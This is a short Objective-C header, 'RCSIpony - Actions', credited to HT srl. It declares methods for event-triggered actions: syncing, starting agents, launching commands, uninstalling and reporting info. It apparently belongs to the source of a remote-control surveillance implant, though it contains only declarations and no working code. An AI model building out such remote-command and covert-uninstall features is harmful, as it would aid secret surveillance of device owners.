/*
 * RCSIpony - Actions
 *  Provides all the actions which should be trigger upon an Event
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 11/06/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#ifndef __RCSIActions_h__
#define __RCSIActions_h__

@interface RCSIActions : NSObject

- (BOOL)actionSync: (NSMutableDictionary *)aConfiguration;
#if 0
- (BOOL)actionSyncAPN: (NSMutableDictionary *)aConfiguration;
#endif
- (BOOL)actionAgent: (NSMutableDictionary *)aConfiguration start: (BOOL)aFlag;
- (BOOL)actionLaunchCommand: (NSMutableDictionary *)aConfiguration;
- (BOOL)actionUninstall: (NSMutableDictionary *)aConfiguration;
- (BOOL)actionInfo: (NSMutableDictionary *)aConfiguration;

@end

#endif
